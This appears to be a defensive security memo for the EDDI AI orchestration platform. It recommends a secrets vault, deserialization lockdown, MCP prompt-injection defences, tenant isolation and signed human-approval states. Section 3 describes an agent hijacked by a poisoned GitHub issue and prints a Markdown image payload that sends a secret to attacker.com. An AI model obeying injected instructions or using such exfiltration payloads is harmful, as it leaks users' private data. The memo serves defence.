Based on the exhaustive Threat Intelligence and Security Research report, the AI orchestration industry is currently experiencing a severe cybersecurity crisis. Competitors are hastily retrofitting security onto platforms originally built for rapid prototyping, resulting in catastrophic vulnerabilities: unauthenticated Remote Code Execution (RCE), massive credential leaks, and trivial Indirect Prompt Injection (IDPI) bypasses.

The most critical takeaway for you is this: **EDDI’s core design philosophy—configuration over code, and strictly typed Java over dynamic script evaluation—is a massive security moat.** Because you use SafeMathParser instead of JavaScript eval() or Python exec(), you are already structurally immune to the sandbox escapes currently crippling n8n (CVE-2025-68613) and Flowise.

However, EDDI’s upcoming v6.0 features (MCP, Persistent Memory) and your explicitly known technical debt (plaintext API keys in MongoDB) require immediate architectural fortification.

Here is the analysis of the security research, translated into **concrete, actionable DevSecOps mandates for EDDI v6.0.**

### ---

**1\. The Secrets Vault: Eradicating Plaintext Config Leaks**

**The Research Conclusion:** Competitors routinely leak highly privileged API keys and OAuth tokens because they store them natively in JSON nodes. When users export a workflow to share or version control it, the plaintext keys are exported with it. Furthermore, logging frameworks dump raw HTTP headers on failure, exposing secrets to observability dashboards (as seen in a CVSS 9.2 CrewAI breach).

**The EDDI Fit:** You explicitly noted that EDDI currently stores API keys (like OpenAI or database credentials) directly in langchain.json and httpcalls.json configurations inside MongoDB. This is your highest-priority security debt.

**Recommendations for EDDI:**

- **Externalized Secrets via Quarkus:** Immediately refactor EDDI’s IResourceStore implementations. EDDI must _never_ store plaintext keys in MongoDB. Use the quarkus-vault or quarkus-amazon-services-secretsmanager extensions. The JSON config should only store a reference (e.g., "${vault:openai-api-key}"), which the engine resolves securely at runtime _in memory only_.
- **AST-Based Export Sanitization:** When a user exports a agent ZIP file via your POST /backup/export/{agentId} endpoint, the backend must actively pass the JSON through an Abstract Syntax Tree (AST) or JSON Node filter that explicitly masks or drops any field named apiKey, token, password, or authorization _before_ creating the ZIP file.
- **Log Entropy Filtering:** Add a Quarkus Log Filter (java.util.logging.Filter or JBoss equivalent) that uses regex to actively mask high-entropy strings (e.g., sk-\[a-zA-Z0-9\]{48}) or Authorization: Bearer headers before they are ever written to System.out, file appenders, or Prometheus traces.

### **2\. Defeating Deserialization & Object Injection**

**The Research Conclusion:** LangChain (CVE-2025-68664) and LangGraph suffered RCE because attackers spoofed specific JSON keys (like lc) during deserialization, forcing the Python backend to instantiate malicious classes that executed outbound HTTP requests to steal environment variables.

**The EDDI Fit:** EDDI relies heavily on Jackson for JSON serialization/deserialization into your IConversationMemory. If an attacker can manipulate the JSON structure of a memory object via an indirect prompt injection, they could potentially trigger Java polymorphic deserialization exploits.

**Recommendations for EDDI:**

- **Strict Polymorphic Typing:** Ensure Jackson is locked down. Never use @JsonTypeInfo(use \= Id.CLASS) or enableDefaultTyping() for untrusted payloads. Ensure your new MemoryKey\<T\> generic types resolve to concrete, allowlisted DTOs. _Never_ allow a JSON payload generated by an LLM to dictate the Java class that Jackson instantiates.
- **The "PathNavigator" Sandbox Lock:** You are already mitigating a massive RCE risk by replacing OGNL (CVE-2025-53192) with PathNavigator. Ensure PathNavigator explicitly _prohibits_ the invocation of .getClass(), .class, or any Java Reflection API methods. It must strictly be limited to evaluating primitive getters on standard Maps and Lists.

### **3\. MCP Security: Surviving Indirect Prompt Injection (IDPI)**

**The Research Conclusion:** The Model Context Protocol (MCP) assumes trust. In the "Toxic Agent Flow" exploit, an agent reading a poisoned GitHub issue (via an MCP read tool) was tricked into overwriting its system prompt and exfiltrating private code. Furthermore, "Markdown Exfiltration" (\!\[img\](https://attacker.com/leak?data=SECRET)) bypasses backend network rules entirely via zero-click frontend rendering.

**The EDDI Fit:** You are implementing MCP as agenth a Client and Server, and your new eddi-chat-ui will render Markdown responses from LLMs.

**Recommendations for EDDI:**

- **State-Changing vs. Read-Only Tools (Backend):** Update your ExtensionDescriptor for tools. Every built-in and MCP tool must be explicitly flagged as READ_ONLY (e.g., fetch weather, read file) or STATE_CHANGING (e.g., execute SQL, write file, send email).
- **Zero-Trust Tool Execution:** If an LLM attempts to execute a STATE_CHANGING tool autonomously, EDDI must cryptographically pause the LifecycleManager pipeline and require a Human-in-the-Loop (HITL) approval via the Manager UI.
- **Eradicate Markdown Exfiltration (Frontend):** In your new React eddi-chat-ui and Manager Chat Panel, configure your Markdown renderer (react-markdown) to explicitly block, proxy, or sanitize external image loading via DOMPurify. Strip any query parameters from \<img\> tags that point to untrusted domains to kill the zero-click exfiltration vector.

### **4\. RAG Privacy: Multi-Tenant Data Isolation**

**The Research Conclusion:** Asana's MCP server leaked metadata across 1,000 corporate tenants because the orchestration engine failed to properly enforce tenant ID checks when querying the backend. AI agents frequently act as "confused deputies," fetching any database record they are asked for, regardless of who is asking.

**The EDDI Fit:** As you build Persistent User Memory (potentially using PostgreSQL or a Vector DB), a flaw here means User A's agent will accidentally recall User B's proprietary data.

**Recommendations for EDDI:**

- **Cryptographic Row-Level Security (RLS):** Never rely on the LLM prompt to filter data (e.g., "Only search for Tenant A's documents"). When EDDI queries the persistent memory store, the Java backend must _hardcode_ the verified tenantId and userId (extracted from the Quarkus JWT) directly into the SQL WHERE clause or vector metadata filter. The LLM must be physically incapable of querying data outside the user's cryptographic scope.
- **Reversible Pseudonymization (PII Masking):** Provide a PiiMaskingTask pre-processor that executes _before_ LangchainTask. It should use regex or fast NLP to find SSNs, emails, and credit cards, replacing them with irreversible hashes (e.g., \<EMAIL_1\>) before the text is sent to an external API like OpenAI, rehydrating the output upon response.

### **5\. Auditability & HITL: Solving the "Black Box"**

**The Research Conclusion:** The EU AI Act requires immutable audit logs of _why_ an AI made a decision. Furthermore, when platforms implement Human-in-the-Loop (HITL) pauses, the paused state saved to the database is vulnerable to tampering before the human approves it.

**The EDDI Fit:** EDDI's sequential execution pipeline provides the perfect foundation for immutable tracing, but you need to secure the "pause" state for future multi-agent flows.

**Recommendations for EDDI:**

- **Cryptographic HITL State Protection:** When EDDI pauses an ILifecycleTask to await human approval for a STATE_CHANGING tool call, the pending execution state (tool name, arguments) must be serialized to MongoDB _with an HMAC-SHA256 signature_ generated by a backend secret. When the admin hits "Approve", the backend must verify the signature. If the state was altered in the database during the pause, execution must violently abort.
- **The Chain-of-Thought Audit Log:** Stop treating execution logs as transient debugging data. For enterprise compliance officers, ensure AgentOrchestrator logs the exact compiled System Prompt, the exact RAG context ingested, the LLM reasoning tokens, and the raw output to a dedicated, immutable IAuditStore.
